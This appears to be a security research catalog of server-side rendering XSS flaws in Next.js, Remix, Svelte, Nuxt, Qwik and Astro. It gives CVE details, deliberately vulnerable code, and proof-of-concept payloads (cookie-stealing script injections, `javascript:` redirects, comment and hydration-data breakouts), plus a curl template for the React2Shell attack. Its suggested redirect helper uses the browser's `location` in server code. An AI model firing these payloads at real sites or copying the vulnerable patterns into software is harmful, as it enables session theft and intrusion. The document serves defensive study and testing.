# 48 - SSR XSS in Modern Frameworks (2024-2026)

## Overview

Server-Side Rendering (SSR) introduces unique XSS attack surfaces that differ from traditional client-side XSS. When XSS exists in SSR output, it fires BEFORE framework hydration and CSP may not apply to inline content rendered during SSR. This document catalogs confirmed SSR XSS vulnerabilities in modern frameworks from 2024-2026, including Next.js, Remix/React Router, Svelte/SvelteKit, Nuxt, Qwik, and Astro, with full CVE details and reproduction steps.

---

## 1. Next.js: React2Shell and Server Components XSS Surface

### CVE-2025-55182: React2Shell (CVSS 10.0 - Critical)

**Affected packages:** `react-server-dom-parcel`, `react-server-dom-webpack`, `react-server-dom-turbopack` versions 19.0 through 19.2.0
**Next.js tracking CVE:** CVE-2025-66478
**Next.js affected versions:** 15.x, 16.x, and 14.3.0-canary.77+
**Patched in:** Next.js 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, and 16.0.7
**Not affected:** Next.js 13.x, 14.x stable, Pages Router applications, Edge Runtime

#### Vulnerability Details

Server-side prototype pollution in the React Server Components (RSC) serialization protocol. The RSC wire protocol (React Flight) creates a new class of server-side deserialization vulnerability structurally similar to Java/PHP deserialization attacks but specific to JavaScript's prototype chain.

Server-side prototype pollution -- which in client-side contexts typically leads to XSS -- escalates directly to remote code execution on the server in the RSC context.

#### Reproduction Steps

1. Create a default Next.js application using `create-next-app` with App Router enabled
2. Ensure the application uses Server Components or Server Actions (default in App Router)
3. Send a crafted multipart POST request to any Server Action endpoint with a `Next-Action` header
4. The payload exploits the `requireModule` function which did not verify that properties were own properties of the module's exports object
5. Prototype pollution achieves RCE by injecting into the module resolution chain

```bash
# Attack vector: crafted multipart POST request
# The Next-Action header identifies the target Server Action
# The multipart body contains the prototype pollution payload
# targeting React Flight protocol deserialization

curl -X POST https://target.com/server-action-endpoint \
  -H "Next-Action: ACTION_ID" \
  -H "Content-Type: multipart/form-data; boundary=---BOUNDARY" \
  --data-binary @prototype-pollution-payload.bin
```

#### In-the-Wild Exploitation

Payloads observed in the wild executed shell commands to:
- Download and execute remote scripts
- Exfiltrate `.env` files containing API keys and database credentials
- Establish reverse shells

#### Fix

The upstream patch changes `requireModule` so it returns a module export only if the property is an own property of the module's exports object, preventing prototype chain traversal.

**Source:** https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/
**Source:** https://nextjs.org/blog/CVE-2025-66478
**Source:** https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2025-112/

### Server Actions SSRF (CVE-2024-34351)

**Affected:** Next.js versions prior to 14.1.1
**Patched in:** Next.js 14.1.1 (PR #62561)

An SSRF vulnerability in Next.js Server Actions discovered by Assetnote. Server Actions that construct URLs from user input can be exploited for server-side request forgery.

**Source:** https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g

### Server Component XSS Patterns (Developer Responsibility)

While no framework-level XSS bypass has been disclosed for Next.js App Router's Server Components, the following patterns remain exploitable:

```jsx
// VULNERABLE - Server Component passing unsanitized data to dangerouslySetInnerHTML
export default async function Page({ searchParams }) {
  const query = searchParams.q;
  return <div dangerouslySetInnerHTML={{ __html: `Results for: ${query}` }} />;
}

// VULNERABLE - Server Component rendering HTML from database
export default async function BlogPost({ params }) {
  const post = await db.posts.findOne({ id: params.id });
  return <article dangerouslySetInnerHTML={{ __html: post.content }} />;
}

// SAFE - React's JSX auto-escaping handles this
export default async function Page({ searchParams }) {
  return <p>Results for: {searchParams.q}</p>;
}
```

### Gaps in Research

- No public research analyzing the React Flight payload format for XSS injection (whether a crafted RSC payload could inject script into client-side hydration)
- No confirmed CVE for hydration mismatch exploitation leading to XSS in Next.js App Router

---

## 2. Remix / React Router: Meta-Tag and Redirect XSS

### CVE-2025-59057: Meta-Tag XSS

**Affected:** Remix / React Router
**Disclosed:** January 2026 (part of batch of six CVEs)

Untrusted input passed into route meta tags could execute JavaScript in the browser. The framework's meta tag rendering API accepted developer-provided strings and rendered them into HTML without escaping.

#### Reproduction Steps

```jsx
// VULNERABLE - Route meta function with unsanitized loader data
export async function loader({ request }) {
  const url = new URL(request.url);
  const searchTerm = url.searchParams.get('q');
  return json({ searchTerm });
}

export const meta = ({ data }) => {
  return [
    { title: `Search: ${data.searchTerm}` },
    { name: "description", content: `Results for ${data.searchTerm}` },
    { property: "og:title", content: data.searchTerm },
  ];
};

// Payload: ?q="><script>alert(document.cookie)</script>
// The meta tag renders as:
// <meta name="description" content="Results for "><script>alert(document.cookie)</script>">
```

#### Injection Points

- `<title>` tag content: `</title><script>alert(1)</script>`
- `<meta name="description">` content attribute
- Open Graph meta tags (`og:title`, `og:description`)
- Twitter Card meta tags
- Any meta tag populated from loader/action return data

**Source:** https://www.netlify.com/changelog/2026-01-15-react-router-remix-security-vulnerabilities/

### CVE-2026-22029: Redirect XSS

**Affected:** Remix / React Router (Actions and experimental RSC Server Functions)
**Disclosed:** January 2026

Actions and experimental RSC Server Functions performing a redirect to a path constructed from untrusted user input could be hijacked to execute JavaScript via `javascript:` protocol URLs.

#### Reproduction Steps

```jsx
// VULNERABLE - Action redirect with user-controlled path
export async function action({ request }) {
  const formData = await request.formData();
  const returnUrl = formData.get('returnUrl');
  // No validation of URL scheme
  return redirect(returnUrl);
}

// Payload: returnUrl=javascript:alert(document.cookie)
// The redirect sends a Location header or client-side navigation to javascript: URL

// VULNERABLE - Loader redirect from query parameter
export async function loader({ request }) {
  const url = new URL(request.url);
  const next = url.searchParams.get('next');
  if (next) return redirect(next);
  return json({});
}

// Payload: ?next=javascript:alert(1)
```

#### Fix

The framework should validate redirect URLs to ensure only `http:` and `https:` protocols are allowed:

```jsx
// SAFE - Validate redirect URL scheme
function safeRedirect(url, defaultRedirect = '/') {
  if (!url || typeof url !== 'string') return defaultRedirect;
  if (!url.startsWith('/') && !url.startsWith(location.origin)) return defaultRedirect;
  return url;
}
```

**Source:** https://www.netlify.com/changelog/2026-01-15-react-router-remix-security-vulnerabilities/

---

## 3. Svelte / SvelteKit: Spread Attributes and Contenteditable XSS

### CVE-2026-27901: SSR Contenteditable XSS

**Affected:** Svelte versions prior to 5.51.5
**Fixed in:** Svelte 5.51.5

`bind:innerText` and `bind:textContent` values were not escaped during server-side rendering. When the server renders a component with a `contenteditable` element bound to user-controlled data, the value is inserted directly into the HTML output without escaping.

#### Reproduction Steps

```svelte
<!-- VULNERABLE COMPONENT: src/routes/+page.svelte -->
<script>
  export let data;
  let userText = data.userInput;
</script>

<!-- bind:innerText not escaped in SSR output -->
<div bind:innerText={userText} contenteditable="true"></div>

<!-- Server load function passing user input -->
<!-- src/routes/+page.server.js -->
<script context="module">
  export async function load({ url }) {
    return {
      userInput: url.searchParams.get('text')
    };
  }
</script>

<!-- Payload: ?text=<img src=x onerror=alert(document.cookie)> -->
<!-- SSR output: <div contenteditable="true"><img src=x onerror=alert(document.cookie)></div> -->
```

**Source:** https://www.netlify.com/changelog/2026-01-15-sveltekit-security-vulnerabilities/

### Svelte SSR Spread Attribute XSS (No CVE Assigned)

**Affected:** Svelte versions prior to 5.51.5
**Fixed in:** Svelte 5.51.5

Event handler properties from untrusted data ended up in SSR HTML output when using spread attributes. The framework's SSR output included all properties from spread objects, including dangerous event handlers like `onclick`, `onerror`, `onload`, etc.

#### Reproduction Steps

```svelte
<!-- VULNERABLE - Spread attributes with untrusted data -->
<script>
  export let props;
  // props could be: { onclick: "alert(1)", class: "card", id: "item-1" }
</script>

<div {...props}>Content</div>

<!-- SSR renders ALL properties including event handlers: -->
<!-- <div onclick="alert(1)" class="card" id="item-1">Content</div> -->

<!-- VULNERABLE PATTERN - API data spread into element -->
<script>
  export let data;
  // data.attributes from API: { "data-id": "123", "onmouseover": "alert(1)" }
</script>
<div {...data.attributes}>Item</div>
```

#### Fix

Svelte 5.51.5 filters spread attributes during SSR to exclude known dangerous attributes (event handlers starting with `on*`).

```svelte
<!-- SAFE in Svelte 5.51.5+ - Event handlers filtered from SSR output -->
<div {...props}>Content</div>
<!-- SSR renders: <div class="card" id="item-1">Content</div> -->
<!-- onclick is stripped from SSR output -->
```

**Source:** https://www.netlify.com/changelog/2026-01-15-sveltekit-security-vulnerabilities/

### CVE-2025-15265: Svelte Client-Side XSS

**Affected:** Svelte 5.46.0 through 5.46.3
**Type:** Client-side only

A client-side XSS vulnerability in specific Svelte versions. Details limited in public advisories.

---

## 4. Nuxt: navigateTo, DevTools, and NoScript XSS

### CVE-2026-45669: Server-Side navigateTo Reflected XSS

**Affected:** Nuxt versions prior to 3.21.6 and 4.4.6
**Fixed in:** Nuxt 3.21.6, Nuxt 4.4.6

Reflected XSS via server-side `navigateTo` with `external: true`. The `navigateTo` function did not validate URL schemes, allowing `javascript:` protocol URLs.

#### Reproduction Steps

```javascript
// VULNERABLE - Server middleware with navigateTo
// server/middleware/redirect.js
export default defineEventHandler((event) => {
  const query = getQuery(event);
  if (query.redirect) {
    return navigateTo(query.redirect, { external: true });
  }
});

// Payload: ?redirect=javascript:alert(document.cookie)

// VULNERABLE - Page-level navigation
// pages/login.vue
<script setup>
const route = useRoute();
const redirectTo = route.query.next;

onMounted(() => {
  if (isAuthenticated.value) {
    navigateTo(redirectTo, { external: true });
  }
});
</script>

// Payload: /login?next=javascript:alert(1)
```

**Source:** https://www.hacktron.ai/security-changelog/nuxt

### CVE-2025-52662: Nuxt DevTools DOM-Based XSS

**Affected:** Nuxt DevTools versions prior to 2.6.4
**Fixed in:** DevTools 2.6.4

DOM-based XSS in the Nuxt DevTools panel. Part of a chain that could lead to RCE in development environments. The DevTools component rendered untrusted data (from the inspected application) into its own DOM without sanitization.

#### Impact Chain

1. Attacker injects XSS payload into the Nuxt application data
2. Developer opens Nuxt DevTools to inspect the application
3. DevTools renders the payload in its own context without escaping
4. XSS executes in the DevTools context, which has elevated privileges
5. In development environments, this can chain to RCE via DevTools APIs

```javascript
// Attack scenario:
// 1. Application stores attacker-controlled data
// 2. DevTools displays this data in its inspection panels
// 3. If data contains <script> or event handlers, they execute in DevTools context
```

**Source:** https://vercel.com/changelog/cve-2025-52662-xss-on-nuxt-devtools

### CVE-2026-56317: Nuxt NoScript Slot XSS

An additional Nuxt XSS vector through the `<NoScript>` slot component handling. The NoScript component did not properly escape content rendered within its slot, allowing XSS when user input flowed into the slot content.

**Source:** https://www.hacktron.ai/security-changelog/nuxt

### Historical: CVE-2024-34343: navigateTo javascript: URL XSS

**Affected:** Earlier Nuxt versions
Mishandled `javascript:` URLs in the `navigateTo` function. This was a precursor to CVE-2026-45669, indicating the `navigateTo` function has been a persistent XSS surface.

### __NUXT__ Data Injection

```html
<!-- Nuxt serializes hydration data in a script tag -->
<script>window.__NUXT__={data:[{searchQuery:"USER_INPUT"}]}</script>

<!-- If USER_INPUT is not properly escaped: -->
<!-- Payload: "}]};alert(document.cookie);// -->
<script>window.__NUXT__={data:[{searchQuery:""}]};alert(document.cookie);//"}]}</script>
```

---

## 5. Qwik: Comment Injection via Resumability (GHSA-m6jq-g7gq-5w3c)

### Advisory: GHSA-m6jq-g7gq-5w3c

**Affected:** qwik-city before version 1.19.0
**CVSS:** 5.3 (Medium)
**Fixed in:** qwik-city 1.19.0

### Vulnerability Details

Qwik's resumability model serializes application state directly into HTML comments so the client can resume execution from server-rendered output without traditional hydration. The bug is in how component-boundary comments are written: SSR builds comment content for virtual components without escaping or quoting.

An attacker-controlled key or value can close the comment early (`-->`) and inject arbitrary HTML/JS. Breaking the comment markers can also lead to resume/hydration desync and unexpected client-side behavior.

### How Qwik's Resumability Creates Unique Risk

In traditional SSR frameworks, HTML comments are inert -- they carry no semantic meaning for the client-side framework. In Qwik, comments contain:

- **Component boundaries:** Mark where virtual components begin and end
- **Event bindings:** Map DOM elements to their event handlers
- **State references:** Pointers to serialized state data
- **Lazy loading markers:** Instructions for when and how to load component code

This means comment injection in Qwik has a fundamentally different impact than in other frameworks.

### Reproduction Steps

```jsx
// VULNERABLE QWIK COMPONENT
import { component$ } from '@builder.io/qwik';

export const UserCard = component$((props) => {
  // props.key or props.title comes from user input
  return (
    <div key={props.userProvidedKey}>
      <h2>{props.title}</h2>
    </div>
  );
});

// The SSR output includes comments like:
// <!--qv q:key=USER_INPUT-->
// <div>...</div>
// <!--/qv-->

// Payload for userProvidedKey:
// value--><!--><script>alert(document.cookie)</script><!--

// Resulting SSR output:
// <!--qv q:key=value--><!--><script>alert(document.cookie)</script><!---->
// The comment is closed early, script tag is injected outside the comment,
// and the remaining --> is consumed by the fake opening <!--
```

### Additional Impact: Hydration Desync

Even without script injection, breaking comment markers can cause:
- Components to resume with incorrect state
- Event handlers to bind to wrong elements
- Application logic to execute in unintended order

**Source:** https://osv.dev/GHSA-m6jq-g7gq-5w3c

---

## 6. Astro: View Transition Directive XSS (CVE-2026-59727)

### CVE-2026-59727

**Affected:** Astro versions 3.10.0 through 7.0.3
**Fixed in:** Astro 7.0.4
**CVSS v4.0:** 2.1 (Low)

### Vulnerability Details

The `transition:persist`, `transition:scope`, and `transition:persist-props` directive values are not HTML-escaped when applied to client-hydrated components (islands). If a developer passes request-derived input into these directives, an attacker can inject arbitrary HTML/script.

### How Astro's Islands Architecture Creates the Risk

Astro's islands architecture has a boundary between static HTML and hydrated components. The `transition:*` directives bridge this boundary by adding attributes to the static HTML that control dynamic behavior (View Transitions API integration). The escaping failure occurs precisely at this static/dynamic boundary.

### Reproduction Steps

```astro
---
// src/pages/product/[id].astro
// VULNERABLE - URL parameter flows into transition directive

const productId = Astro.url.searchParams.get('id');
// Or from dynamic route: const { id } = Astro.params;
---

<html>
<head>
  <title>Product</title>
</head>
<body>
  <!-- VULNERABLE - transition:persist with user input -->
  <div transition:persist={productId}>
    <ProductDetails client:load />
  </div>

  <!-- VULNERABLE - transition:scope with user input -->
  <section transition:scope={productId}>
    <ProductGallery client:visible />
  </section>

  <!-- VULNERABLE - transition:persist-props with user input -->
  <aside transition:persist-props={productId}>
    <ProductReviews client:idle />
  </aside>
</body>
</html>

<!-- Payload: ?id="><img src=x onerror=alert(document.cookie)>
     SSR output: <div transition:persist=""><img src=x onerror=alert(document.cookie)>">
     The attribute value is closed, and the onerror handler executes -->
```

### Severity Context

The low CVSS score (2.1) reflects that:
1. The attacker needs the developer to have written code that pipes untrusted input into a `transition:*` attribute
2. This is an uncommon pattern -- most developers use static strings for transition identifiers
3. However, applications that generate dynamic page transition identifiers from URL parameters or database values are exploitable

### Other Astro XSS Surfaces

```astro
---
const userContent = Astro.url.searchParams.get('content');
---
<!-- VULNERABLE - set:html renders raw HTML (by design, but dangerous with user input) -->
<div set:html={userContent}></div>
<Fragment set:html={userContent} />

<!-- SAFE - Astro's default output escaping -->
<p>{userContent}</p>
```

### Gaps in Research

- No broader security audit of Astro's island hydration boundary has been published
- Whether other directive values (e.g., `client:*` directives) have similar escaping gaps is unknown
- No research on Astro's partial hydration allowing injection into the hydration script/data payload itself

**Source:** https://corgea.com/advisories/vulnerabilities/CVE-2026-59727
**Source:** https://osv.dev/vulnerability/CVE-2026-59727
**Source:** https://vulert.com/vuln-db/CVE-2026-59727

---

## 7. Cross-Framework SSR XSS Patterns

### Common SSR XSS Sinks Across All Frameworks

| Pattern | Frameworks Affected | Risk |
|---------|-------------------|------|
| Unsafe HTML rendering APIs | All (dangerouslySetInnerHTML, v-html, {@html}, set:html) | High - developer responsibility |
| Meta tag injection from loader data | Remix, Next.js, Nuxt, SvelteKit | High - framework CVEs issued |
| Redirect to user-controlled URLs | Remix, Nuxt, Next.js | High - javascript: protocol |
| Hydration data injection | Next.js (__NEXT_DATA__), Nuxt (__NUXT__) | Medium - JSON context breakout |
| Spread attributes in SSR | Svelte, potentially others | High - event handler injection |
| Comment-based state serialization | Qwik (resumability) | Medium - comment injection |
| View transition directives | Astro | Low - uncommon pattern |
| DevTools data rendering | Nuxt | Medium - dev environment only |

### Why SSR XSS Is Often More Severe

1. **Pre-hydration execution:** XSS in SSR output fires before the framework's client-side code initializes, bypassing client-side security mechanisms
2. **CSP timing:** If CSP is delivered via `<meta>` tag rather than HTTP header, SSR XSS executes before the CSP meta tag is parsed
3. **No client-side sanitization:** Server-rendered HTML is trusted by the browser; client-side sanitizers (DOMPurify, Trusted Types) do not process it
4. **Broader impact:** SSR XSS affects all users (including those with JavaScript disabled) and is visible to search engine crawlers

### Testing Methodology for SSR XSS

1. **Identify the framework** and its version (view source, response headers, bundle filenames)
2. **Map SSR data flow:** Trace how URL parameters, form data, and database values flow into SSR output
3. **Test framework-specific vectors:**
   - Next.js: Check __NEXT_DATA__ for reflected input, test Server Actions
   - Remix: Test meta functions, loader data in meta tags, redirect targets
   - Svelte: Test spread attributes, bind:innerText, {@html} in SSR context
   - Nuxt: Test navigateTo calls, __NUXT__ data, DevTools (dev environments)
   - Qwik: Test component keys and state values that appear in HTML comments
   - Astro: Test transition:* directives, set:html usage
4. **Compare client vs server rendering:** The same input may be safe in client rendering but XSS in SSR
5. **Test with JavaScript disabled:** SSR XSS fires without JavaScript; test in browsers with JS disabled
6. **Check CSP delivery:** If CSP is via meta tag, SSR XSS may execute before it is parsed

---

## References

- Datadog React2Shell Analysis: https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/
- Next.js CVE-2025-66478 Advisory: https://nextjs.org/blog/CVE-2025-66478
- CSA Singapore Alert AL-2025-112: https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2025-112/
- Endor Labs RCE Analysis: https://www.endorlabs.com/learn/critical-remote-code-execution-rce-vulnerabilities-in-react-and-next-js
- Next.js SSRF Advisory GHSA-fr5h-rqp8-mj6g: https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g
- Netlify Remix/React Router CVEs: https://www.netlify.com/changelog/2026-01-15-react-router-remix-security-vulnerabilities/
- Netlify SvelteKit CVEs: https://www.netlify.com/changelog/2026-01-15-sveltekit-security-vulnerabilities/
- HackTron Nuxt Changelog: https://www.hacktron.ai/security-changelog/nuxt
- Vercel Nuxt DevTools CVE: https://vercel.com/changelog/cve-2025-52662-xss-on-nuxt-devtools
- Vulners Nuxt CVE List: https://vulners.com/search/vendors/nuxt/products/nuxt
- OSV Qwik Advisory: https://osv.dev/GHSA-m6jq-g7gq-5w3c
- Corgea Astro Advisory: https://corgea.com/advisories/vulnerabilities/CVE-2026-59727
- OSV Astro CVE: https://osv.dev/vulnerability/CVE-2026-59727
- HackTron Next.js Changelog: https://www.hacktron.ai/security-changelog/nextjs
